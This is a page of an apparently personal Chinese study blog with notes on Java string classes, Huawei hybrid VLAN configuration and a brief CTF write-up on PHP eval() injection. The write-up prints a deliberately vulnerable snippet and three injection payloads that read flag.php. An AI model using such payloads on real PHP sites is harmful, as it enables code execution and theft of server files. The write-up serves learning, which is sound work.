+<h3 id="遍历字符串："><a href="#遍历字符串：" class="headerlink" title="遍历字符串："></a>遍历字符串：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">char</span> <span class="title function_">charAt</span><span class="params">(<span class="type">int</span> index)</span>      <span class="comment">//根据索引返回字符</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">length</span><span class="params">()</span>             <span class="comment">//返回此字符串的长度</span></span><br><span class="line">数组的长度：数组名.length</span><br><span class="line">字符串的长度: 字符串对象.length()</span><br></pre></td></tr></table></figure></li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//charAt()：会根据索引获取对应的字符</span></span><br><span class="line"><span class="comment">//length(): 会返回字符串的长度</span></span><br></pre></td></tr></table></figure>
+
+<p>fori :正着遍历      forr：倒着遍历</p>
+<h3 id="String内存模型："><a href="#String内存模型：" class="headerlink" title="String内存模型："></a>String内存模型：</h3><p>当使用双引号直接赋值时，系统会检查该字符串在串池中是否存在。</p>
+<p>不存在：创建新的     存在：复用</p>
+<p>eg：分别创建字符串s1、s2，并且用“abc”赋值，则它们指向的是同一个位置。</p>
+<h3 id="字符串截取"><a href="#字符串截取" class="headerlink" title="字符串截取"></a>字符串截取</h3><p>String substring（int beginIndex，int endIndex）截取</p>
+<p>注意点：包头不包尾，包左不包右；只有返回值才是截取的小串</p>
+<p>String substring（int beginIndex)  截取到末尾</p>
+<p>String replace (旧值，新值)  替换</p>
+<p>注意点：只有返回值才是替换之后的结果</p>
+<h2 id="3-StringBuilder"><a href="#3-StringBuilder" class="headerlink" title="3.StringBuilder"></a>3.StringBuilder</h2><p>StringBuilder 可以看成是一个容器，创建之后里面的内容是可变的。</p>
+<p>当我们在拼接字符串和反转字符串的时候会使用到</p>
+<h3 id="3-1-基本使用"><a href="#3-1-基本使用" class="headerlink" title="3.1 基本使用"></a>3.1 基本使用</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StringBuilderDemo3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//1.创建对象</span></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.添加元素</span></span><br><span class="line">        <span class="comment">/*sb.append(1);</span></span><br><span class="line"><span class="comment">        sb.append(2.3);</span></span><br><span class="line"><span class="comment">        sb.append(true);*/</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//反转</span></span><br><span class="line">        sb.reverse();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取长度</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> sb.length();</span><br><span class="line">        System.out.println(len);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//打印</span></span><br><span class="line">        <span class="comment">//普及：</span></span><br><span class="line">        <span class="comment">//因为StringBuilder是Java已经写好的类</span></span><br><span class="line">        <span class="comment">//java在底层对他做了一些特殊处理。</span></span><br><span class="line">        <span class="comment">//打印对象不是地址值而是属性值。</span></span><br><span class="line">        System.out.println(sb);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-2-链式编程"><a href="#3-2-链式编程" class="headerlink" title="3.2 链式编程"></a>3.2 链式编程</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StringBuilderDemo4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//1.创建对象</span></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.添加字符串</span></span><br><span class="line">        sb.append(<span class="string">&quot;aaa&quot;</span>).append(<span class="string">&quot;bbb&quot;</span>).append(<span class="string">&quot;ccc&quot;</span>).append(<span class="string">&quot;ddd&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(sb);<span class="comment">//aaabbbcccddd</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.再把StringBuilder变回字符串</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> sb.toString();</span><br><span class="line">        System.out.println(str);<span class="comment">//aaabbbcccddd</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-3-练习1：对称字符串"><a href="#3-3-练习1：对称字符串" class="headerlink" title="3.3 练习1：对称字符串"></a>3.3 练习1：对称字符串</h3><p>需求：</p>
+<p>​	键盘接受一个字符串，程序判断出该字符串是否是对称字符串，并在控制台打印是或不是</p>
+<pre><code>  对称字符串：123321、111
+  
+  非对称字符串：123123
+</code></pre>
+<p>代码示例：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StringBuilderDemo6</span> &#123;</span><br><span class="line">    <span class="comment">//使用StringBuilder的场景：</span></span><br><span class="line">    <span class="comment">//1.字符串的拼接</span></span><br><span class="line">    <span class="comment">//2.字符串的反转</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//1.键盘录入一个字符串</span></span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入一个字符串&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> sc.next();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.反转键盘录入的字符串</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>().append(str).reverse().toString();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.比较</span></span><br><span class="line">        <span class="keyword">if</span>(str.equals(result))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;当前字符串是对称字符串&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;当前字符串不是对称字符串&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="3-4-练习2：拼接字符串"><a href="#3-4-练习2：拼接字符串" class="headerlink" title="3.4 练习2：拼接字符串"></a>3.4 练习2：拼接字符串</h3><p>需求：定义一个方法，把 int 数组中的数据按照指定的格式拼接成一个字符串返回。</p>
+<p>​          调用该方法，并在控制台输出结果。</p>
+<p>​          例如：数组为int[] arr &#x3D; {1,2,3}; </p>
+<p>​          执行方法后的输出结果为：[1, 2, 3]</p>
+<p>代码示例:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima.stringbuilderdemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StringBuilderDemo7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//1.定义数组</span></span><br><span class="line">        <span class="type">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.调用方法把数组变成字符串</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> arrToString(arr);</span><br><span class="line"></span><br><span class="line">        System.out.println(str);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">arrToString</span><span class="params">(<span class="type">int</span>[] arr)</span>&#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        sb.append(<span class="string">&quot;[&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i == arr.length - <span class="number">1</span>)&#123;</span><br><span class="line">                sb.append(arr[i]);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                sb.append(arr[i]).append(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sb.append(<span class="string">&quot;]&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="4-StringJoiner"><a href="#4-StringJoiner" class="headerlink" title="4. StringJoiner"></a>4. StringJoiner</h2><ul>
+<li>StringJoiner跟StringBuilder一样，也可以看成是一个容器，创建之后里面的内容是可变的。</li>
+<li>作用：提高字符串的操作效率，而且代码编写特别简洁，但是目前市场上很少有人用。 </li>
+<li>JDK8出现的</li>
+</ul>
+<p>基本使用：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.创建一个对象，并指定中间的间隔符号</span></span><br><span class="line"><span class="type">StringJoiner</span> <span class="variable">sj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringJoiner</span>(<span class="string">&quot;---&quot;</span>);</span><br><span class="line"><span class="comment">//2.添加元素</span></span><br><span class="line">sj.add(<span class="string">&quot;aaa&quot;</span>).add(<span class="string">&quot;bbb&quot;</span>).add(<span class="string">&quot;ccc&quot;</span>);</span><br><span class="line"><span class="comment">//3.打印结果</span></span><br><span class="line">System.out.println(sj);<span class="comment">//aaa---bbb---ccc</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.创建对象</span></span><br><span class="line"><span class="type">StringJoiner</span> <span class="variable">sj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringJoiner</span>(<span class="string">&quot;, &quot;</span>,<span class="string">&quot;[&quot;</span>,<span class="string">&quot;]&quot;</span>);</span><br><span class="line"><span class="comment">//2.添加元素</span></span><br><span class="line">sj.add(<span class="string">&quot;aaa&quot;</span>).add(<span class="string">&quot;bbb&quot;</span>).add(<span class="string">&quot;ccc&quot;</span>);</span><br><span class="line"><span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> sj.length();</span><br><span class="line">System.out.println(len);<span class="comment">//15</span></span><br><span class="line"><span class="comment">//3.打印</span></span><br><span class="line">System.out.println(sj);<span class="comment">//[aaa, bbb, ccc]</span></span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> sj.toString();</span><br><span class="line">System.out.println(str);<span class="comment">//[aaa, bbb, ccc]</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="关于字符串的小扩展："><a href="#关于字符串的小扩展：" class="headerlink" title="关于字符串的小扩展："></a>关于字符串的小扩展：</h2><ol>
+<li><p>字符串存储的内存原理</p>
+<p>String s &#x3D; “abc”；直接赋值</p>
+<p>特点：</p>
+<p>​	此时字符串abc是存在字符串常量池中的。</p>
+<p>​	先检查字符串常量池中有没有字符串abc，如果有，不会创建新的，而是直接复用。如果没有abc，才会创建一个新的。</p>
+<p>所以，直接赋值的方式，代码简单，而且节约内存。</p>
+</li>
+<li><p>new出来的字符串</p>
+<p>看到new关键字，一定是在堆里面开辟了一个小空间。</p>
+<p>String s1 &#x3D; new String（“abc”）；</p>
+<p>String s2 &#x3D; “abc”；</p>
+<p>s1记录的是new出来的，在堆里面的地址值。</p>
+<p>s2是直接赋值的，所以记录的是字符串常量池中的地址值。</p>
+</li>
+<li><p>&#x3D;&#x3D;号比较的到底是什么？</p>
+<p>如果比较的是基本数据类型：比的是具体的数值是否相等。</p>
+<p>如果比较的是引用数据类型：比的是地址值是否相等。</p>
+<p>结论：&#x3D;&#x3D;只能用于比较基本数据类型。不能比较引用数据类型。</p>
+</li>
+</ol>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
+
+   
+   
+  
+</article>
+
+    
+    <article
+  id="post-ipv4&amp;ipv6"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+     
+    <div class="article-meta">
+      <a href="/2024/07/29/ipv4&ipv6/" class="article-date">
+  <time datetime="2024-07-29T10:28:11.171Z" itemprop="datePublished">2024-07-29</time>
+</a>    
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+   
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
+
+   
+   
+  
+</article>
+
+    
+    <article
+  id="post-hybrid"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+     
+    <div class="article-meta">
+      <a href="/2024/07/29/hybrid/" class="article-date">
+  <time datetime="2024-07-29T10:28:11.169Z" itemprop="datePublished">2024-07-29</time>
+</a>    
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p>[Huawei]vlan bat 10 20		&#x2F;&#x2F;批量创建10、20<br>#[Huawei]vlan bat 10 to 20	&#x2F;&#x2F;批量创建10-20<br>#[Huawei]vlan 10			&#x2F;&#x2F;只创建vlan 10<br>#[Huawei-vlan10]description caiwubu		&#x2F;&#x2F;给vlan备注说明信息<br>[Huawei]int e0&#x2F;0&#x2F;1<br>[Huawei-Ethernet0&#x2F;0&#x2F;1]port link-type hybrid 	&#x2F;&#x2F;指定接口类型为hybrid<br>[Huawei-Ethernet0&#x2F;0&#x2F;1]port hybrid pvid vlan 10	&#x2F;&#x2F;将当前接口加入vlan10</p>
+<p>[Huawei]int e0&#x2F;0&#x2F;2<br>[Huawei-Ethernet0&#x2F;0&#x2F;1]port link-type hybrid 	<br>[Huawei-Ethernet0&#x2F;0&#x2F;1]port hybrid pvid vlan 10	</p>
+<p>[Huawei]int e0&#x2F;0&#x2F;3<br>[Huawei-Ethernet0&#x2F;0&#x2F;1]port link-type hybrid 	<br>[Huawei-Ethernet0&#x2F;0&#x2F;1]port hybrid pvid vlan 20	</p>
+<p>[Huawei-Ethernet0&#x2F;0&#x2F;2]port hybrid untagged vlan 10  &#x2F;&#x2F;脱标签<br>[Huawei-Ethernet0&#x2F;0&#x2F;1]port hybrid untagged vlan 10  &#x2F;&#x2F;回去也要有脱标签，这样pc1和pc2才能通信</p>
+<p>实现PC1，PC2和服务器1通信：<br>如果数据直接从LSW1发送，没有标签，那么LSW2接收到数据后，判断没有标签，会给数据打上默认的1pvid标签，发送的时候untag1，但是发往PC4和PC5都有untag1，不合理，所以我们在发送的时候采用tag，LSW1和LSW2的tag表都要包含10，因为PC收到的都是没有标签的流量，所以LSW2往下发的时候需要一个untag10。<br>（LSW之间配untag或者tag都可以实现，但是tag好一点）</p>
+<p>[Huawei]int e0&#x2F;0&#x2F;4<br>[Huawei-Ethernet0&#x2F;0&#x2F;4]port link-type hybrid<br>[Huawei-Ethernet0&#x2F;0&#x2F;4]port hybrid tagged vlan 10  &#x2F;&#x2F;给LSW1的接口配上tag 10</p>
+<p>[Huawei]int e0&#x2F;0&#x2F;1<br>[Huawei-Ethernet0&#x2F;0&#x2F;1]port link-ty	<br>[Huawei-Ethernet0&#x2F;0&#x2F;1]port link-type hybrid<br>[Huawei-Ethernet0&#x2F;0&#x2F;1]port hybrid tagged vlan 10  &#x2F;&#x2F;给LSW2的接口配上tag 10</p>
+<p>[Huawei]int e0&#x2F;0&#x2F;2<br>[Huawei-Ethernet0&#x2F;0&#x2F;2]port link-type hybrid<br>[Huawei-Ethernet0&#x2F;0&#x2F;2]port hybrid untagged vlan 10  &#x2F;&#x2F;流量从下来的时候需要脱标签，untag</p>
+<p>当PC4返回数据时，经过LSW2，LSW1，所以需要在这两个上面加上tag 30<br>到达LSW1后，发往PC1，流量标签为30，所以需要在LSW1到PC1的接口上面加上untag 30</p>
+<p>但此时任然无法通信，为什么<br>我们查看LSW2的vlan（命令：dis vlan），只有vlan1 30 40，没有vlan10，说明看不到PC1的vlan10<br>我们需要添加上对应的vlan<br>[Huawei-Ethernet0&#x2F;0&#x2F;1]vlan 10<br>[Huawei-vlan10]vlan 20<br>[Huawei-vlan20]</p>
+<p>此时还是还是不能ping，为什么？？<br>配置注意事项：<br>1.所有互联交换机必须要创建对方交换机的所有vlan编号<br>2.为交换机接口指定了非PVID1的编号，一定要将该编号加入该接口的untag列表或者tag列表中</p>
+<p>给LSW1的4接口配上tag20和40标签<br>[Huawei-Ethernet0&#x2F;0&#x2F;4]port hybrid tagged vlan 20<br>[Huawei-Ethernet0&#x2F;0&#x2F;4]port hybrid tagged vlan 40<br>LSW2同操作<br>PC2的流量发过来后，带有标签20，所以LSW2的3接口配上untag 20<br>同理，PC3的流量发过来后，带有标签40，所以LSW2的3接口配上untag 40</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
+
+   
+   
+  
+</article>
+
+    
+    <article
+  id="post-eval一道简单题"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+     
+    <div class="article-meta">
+      <a href="/2024/07/29/eval%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95%E9%A2%98/" class="article-date">
+  <time datetime="2024-07-29T10:28:11.166Z" itemprop="datePublished">2024-07-29</time>
+</a>    
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="PHP-eval-注入问题"><a href="#PHP-eval-注入问题" class="headerlink" title="PHP eval() 注入问题"></a>PHP eval() 注入问题</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="variable">$a</span> = @<span class="variable">$_REQUEST</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line">    <span class="keyword">eval</span>( <span class="string">&quot;var_dump(<span class="subst">$a</span>);&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="关键函数"><a href="#关键函数" class="headerlink" title="关键函数"></a>关键函数</h2><p>• include()，引用文件，说明flag.php在同一文件夹下。</p>
+<p>• $_REQUEST[ ]等同于$_GET + $_POST，都可以用。</p>
+<p>• eval()能将字符串按PHP代码执行，这里是常用的的PHP注入点。（题眼在这里）</p>
+<p>• var_dump()显示表达式的类型和值，可以递归展开数组。</p>
+<p>• show_source()高亮文件，这里没啥用。</p>
+<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>( <span class="string">&quot;var_dump(<span class="subst">$a</span>);&quot;</span>);</span><br><span class="line"><span class="keyword">eval</span>( <span class="string">&quot;var_dump(a);print_r(file(&quot;</span>flag.php<span class="string">&quot;));    //     );&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>用GET方法传参构造注入:</p>
+<p>&#x2F;?hello&#x3D;1);print_r(file(“flag.php”));&#x2F;&#x2F;</p>
+<p>&#x2F;?hello&#x3D;1);闭合var_dump的括号</p>
+<p>file(“flag.php”)提取文件内容为字符数组（一行为一个字符串）</p>
+<p>print_r()逐行打印</p>
+<p>flag.php”));&#x2F;&#x2F;这后面的第二个括号是闭合eval的括号</p>
+<p>&#x2F;&#x2F;是为了注释后面的东西</p>
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?hello=file(&#x27;flag.php&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>file() 函数把整个文件读入一个数组中。(注意参数是字符串)</p>
+<h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?hello=1);show_source(%27flag.php%27);var_dump(</span><br></pre></td></tr></table></figure> 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
+
+   
+   
+  
+</article>
+
+    
+  </article>
+  
+
+  
+  <nav class="page-nav">
+    
+    <a class="extend prev" rel="prev" href="/">上一页</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">下一页</a>
+  </nav>
+  
+</section>
+</div>
+
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2024
+        <i class="ri-heart-fill heart_icon"></i> Ymnnb
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="Ymnnb"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="http://47.109.32.204/cat/">猫猫</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="https://yunchenqwq.github.io/Genshin_Start.github.io/">嘻嘻</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i></p>
+  <div class="reward-box">
+    
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
